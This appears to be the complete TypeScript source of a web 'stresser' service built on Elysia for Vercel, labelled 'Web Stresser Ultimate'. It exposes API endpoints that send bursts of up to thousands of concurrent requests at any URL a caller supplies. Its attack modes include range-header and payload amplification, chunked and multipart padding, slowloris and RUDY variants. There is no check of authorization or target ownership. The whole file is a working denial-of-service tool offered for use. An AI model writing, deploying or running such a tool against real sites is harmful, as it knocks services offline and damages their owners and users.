import { Elysia, t } from 'elysia';
import { setGlobalDispatcher, Agent } from 'undici';

// Koneksi pool untuk Vercel
const globalAgent = new Agent({
  connections: 100,
  pipelining: 1,
  keepAliveTimeout: 60000,
});
setGlobalDispatcher(globalAgent);

// Active users counter
const activeUsers = new Map<string, number>();
setInterval(() => {
  const now = Date.now();
  for (const [key, timestamp] of activeUsers.entries()) {
    if (now - timestamp > 60000) activeUsers.delete(key);
  }
}, 30000);

// Helper
function randomString(n: number): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < n; i++) result += chars[Math.floor(Math.random() * chars.length)];
  return result;
}

function generateAmplificationPayload(kb: number, ampType: string): string {
  if (kb <= 0) return '';
  const size = kb * 1024;
  if (ampType === 'range') return '';
  return 'X'.repeat(size);
}

// Single attack
interface SingleAttackParams {
  url: string;
  method: string;
  headers: Record<string, string>;
  body: string;
  timeout: number;
  retryCount: number;
  randomDelay: number;
  keepAlive: boolean;
  attackType: string;
  amplifyKB: number;
  amplifyEnabled: boolean;
  amplifyType: string;
}

async function singleAttack(params: SingleAttackParams): Promise<any> {
  const {
    url, method, headers, body,
    timeout, retryCount, randomDelay,
    keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
  } = params;

  let finalMethod = method.toUpperCase();
  let finalUrl = url;
  let finalHeaders = { ...headers };
  let finalBody = body || '';
  let useBody = false;

  if (randomDelay > 0) await new Promise(r => setTimeout(r, Math.random() * randomDelay));

  let ampPayload = '';
  if (amplifyEnabled && amplifyKB > 0) {
    ampPayload = generateAmplificationPayload(amplifyKB, amplifyType);
  }

  switch (attackType) {
    case 'range':
      finalHeaders['Range'] = `bytes=0-${amplifyKB * 1024}`;
      break;
    case 'chunked':
      finalBody = body + ampPayload;
      useBody = true;
      finalHeaders['Transfer-Encoding'] = 'chunked';
      break;
    case 'multipart':
      const boundary = `----WebKitFormBoundary${randomString(16)}`;
      finalHeaders['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
      const part = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="amp.txt"\r\nContent-Type: text/plain\r\n\r\n${ampPayload}\r\n--${boundary}--\r\n`;
      finalBody = part;
      useBody = true;
      break;
    case 'slowloris':
      finalHeaders['Connection'] = 'keep-alive';
      break;
    case 'rudy':
      await new Promise(r => setTimeout(r, 2000));
      if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
      else finalBody = body;
      useBody = true;
      break;
    default:
      if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
      else finalBody = body;
      useBody = true;
  }

  if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length > 2048) {
    finalMethod = 'POST';
    useBody = true;
    finalBody = ampPayload;
  } else if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length <= 2048) {
    const separator = finalUrl.includes('?') ? '&' : '?';
    finalUrl += `${separator}_amp=${encodeURIComponent(ampPayload)}`;
    useBody = false;
  }

  if (!finalHeaders['Accept']) finalHeaders['Accept'] = '*/*';
  if (keepAlive) finalHeaders['Connection'] = 'keep-alive';
  else finalHeaders['Connection'] = 'close';

  const fetchOptions: any = {
    method: finalMethod,
    headers: finalHeaders,
    signal: AbortSignal.timeout(Math.min(timeout, 9000)),
    redirect: 'manual',
    dispatcher: globalAgent,
  };
  if (useBody && (finalMethod === 'POST' || finalMethod === 'PUT' || finalMethod === 'PATCH')) {
    fetchOptions.body = finalBody;
  }

  let lastError: any = null;
  let lastStatusCode = 0;
  let responseSize = 0;
  let responsePreview = '';
  let durationMs = 0;
  let retriesUsed = 0;

  const baseDelay = 100;
  for (let attempt = 0; attempt <= Math.min(retryCount, 2); attempt++) {
    if (attempt > 0) await new Promise(r => setTimeout(r, baseDelay * attempt));
    const start = Date.now();
    try {
      const res = await fetch(finalUrl, fetchOptions);
      durationMs = Date.now() - start;
      lastStatusCode = res.status;
      const buffer = await res.arrayBuffer();
      responseSize = buffer.byteLength;
      const text = new TextDecoder().decode(buffer);
      responsePreview = text.slice(0, 500);
      if (res.status >= 200 && res.status < 400) {
        retriesUsed = attempt;
        break;
      }
    } catch (err: any) {
      durationMs = Date.now() - start;
      lastError = err;
    }
  }

  const success = lastStatusCode >= 200 && lastStatusCode < 400;
  const errorMsg = lastError ? lastError.message : '';

  return {
    success,
    statusCode: lastStatusCode,
    durationMs,
    error: errorMsg,
    retries: retriesUsed,
    responseSize,
    responseBody: responsePreview,
  };
}

// Batch attack
interface BatchAttackParams {
  url: string;
  method: string;
  headers: Record<string, string>;
  body: string;
  timeout: number;
  retryCount: number;
  randomDelay: number;
  keepAlive: boolean;
  attackType: string;
  amplifyKB: number;
  amplifyEnabled: boolean;
  amplifyType: string;
  concurrency: number;
  total: number;
}

async function batchAttack(params: BatchAttackParams): Promise<any> {
  const {
    url, method, headers, body, timeout, retryCount, randomDelay,
    keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
    concurrency, total,
  } = params;

  const startTime = Date.now();
  let successCount = 0;
  let failCount = 0;
  let totalBytes = 0;
  let latencies: number[] = [];

  const runOne = async () => {
    const result = await singleAttack({
      url, method, headers, body, timeout: Math.min(timeout, 9000), retryCount, randomDelay,
      keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType
    });
    if (result.success) successCount++;
    else failCount++;
    totalBytes += result.responseSize;
    latencies.push(result.durationMs);
  };

  let index = 0;
  const workers: Promise<void>[] = [];
  const actualConcurrency = Math.min(concurrency, 50);
  const actualTotal = Math.min(total, 5000);
  for (let i = 0; i < actualConcurrency; i++) {
    workers.push(new Promise<void>(async (resolve) => {
      while (index < actualTotal) {
        index++;
        await runOne();
      }
      resolve();
    }));
  }
  await Promise.all(workers);

  const totalTime = Date.now() - startTime;
  const avgLatency = latencies.length ? latencies.reduce((a,b)=>a+b,0)/latencies.length : 0;
  const rps = totalTime > 0 ? ((successCount+failCount) / (totalTime/1000)).toFixed(2) : 0;

  return {
    success: true,
    totalRequests: (successCount+failCount),
    successCount,
    failCount,
    totalBytes,
    totalTimeMs: totalTime,
    avgLatencyMs: avgLatency,
    rps,
    latencies: latencies.slice(0, 100),
  };
}

// ==================== Elysia App ====================
export const app = new Elysia()
  .onError(({ error, set }) => {
    set.status = 200;
    console.error(error);
    const errorMessage = error instanceof Error ? error.message : String(error);
    return { success: false, error: errorMessage };
  })
  .get('/api/status', () => ({
    status: 'ok',
    message: '💀 Web Stresser Ultimate - Elysia on Vercel',
    version: '2.0.0',
  }))
  .post('/api/attack', async ({ body }) => {
    try {
      const result = await singleAttack(body as SingleAttackParams);
      return result;
    } catch (err: any) {
      return { success: false, error: err.message, durationMs: 0 };
    }
  }, {
    body: t.Object({
      url: t.String(),
      method: t.String(),
      headers: t.Record(t.String(), t.String()),
      body: t.String(),
      timeout: t.Number(),
      retryCount: t.Number(),
      randomDelay: t.Number(),
      keepAlive: t.Boolean(),
      attackType: t.String(),
      amplifyKB: t.Number(),
      amplifyEnabled: t.Boolean(),
      amplifyType: t.String(),
    }),
  })
  .post('/api/batch', async ({ body }) => {
    try {
      const result = await batchAttack(body as BatchAttackParams);
      return result;
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  }, {
    body: t.Object({
      url: t.String(),
      method: t.String(),
      headers: t.Record(t.String(), t.String()),
      body: t.String(),
      timeout: t.Number(),
      retryCount: t.Number(),
      randomDelay: t.Number(),
      keepAlive: t.Boolean(),
      attackType: t.String(),
      amplifyKB: t.Number(),
      amplifyEnabled: t.Boolean(),
      amplifyType: t.String(),
      concurrency: t.Number(),
      total: t.Number(),
    }),
  })
  .get('/api/heartbeat', ({ request }) => {
    const ip = request.headers.get('x-forwarded-for') || 'unknown';
    const ua = request.headers.get('user-agent') || 'unknown';
    const key = `${ip}|${ua}`;
    activeUsers.set(key, Date.now());
    return { active: activeUsers.size };
  });

export default app;
